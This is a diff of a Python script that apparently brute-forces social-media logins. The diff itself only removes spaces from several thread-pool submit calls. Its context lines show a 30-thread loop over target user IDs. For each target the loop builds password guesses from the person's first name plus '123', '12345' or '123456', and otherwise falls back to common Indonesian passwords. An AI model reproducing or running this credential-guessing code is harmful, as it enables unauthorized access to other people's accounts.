@@ -1121,7 +1121,7 @@ def fii_xd():
 					started()
 					for user in id:
 					  id, name = user.split("<=>")
-						coeg.submit(mbasicc, id, asu)
+						coeg.submit(mbasicc,id,asu)
 				exit()
 			elif ter in ["d","D"]:
 				with ThreadPoolExecutor(max_workers=30) as coeg:
@@ -1137,7 +1137,7 @@ def fii_xd():
 							fii = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
 						else:
 							fii = [ "bissmilah", "anjing", "indonesia", "sayangkamu" ]
-						coeg.submit(mobill, id, fii)
+						coeg.submit(mobill,id,fii)
 				exit()
 				
 	elif fiisayangwidiya in ["2","02"]:
@@ -1170,7 +1170,7 @@ def fii_xd():
 							started()
 							for user in id:
 								uid, name = user.split("<=>")
-								coeg.submit(mbasic, id, asu)
+								coeg.submit(mbasic,id,asu)
 						exit()
 					elif ter in ["d","D"]:
 						with ThreadPoolExecutor(max_workers=30) as coeg:
@@ -1186,7 +1186,7 @@ def fii_xd():
 									fii = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
 								else:
 									fii = [ "bissmilah", "anjing", "indonesia", "sayangkamu" ]
-								coeg.submit(mbasic, id, fii)
+								coeg.submit(mbasic,id,fii)
 						exit()
 				else:print(f"{key}");exit()
 			except (KeyError,IOError):print(f"{_key}");exit()
@@ -1227,7 +1227,7 @@ def fii_xd():
 							fii = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
 						else:
 							fii = [ "bissmilah", "anjing", "indonesia", "sayangkamu" ]
-						coeg.submit(mbasicc, id, fii)
+						coeg.submit(mbasicc,id,fii)
 				exit()
 				
 def kone():
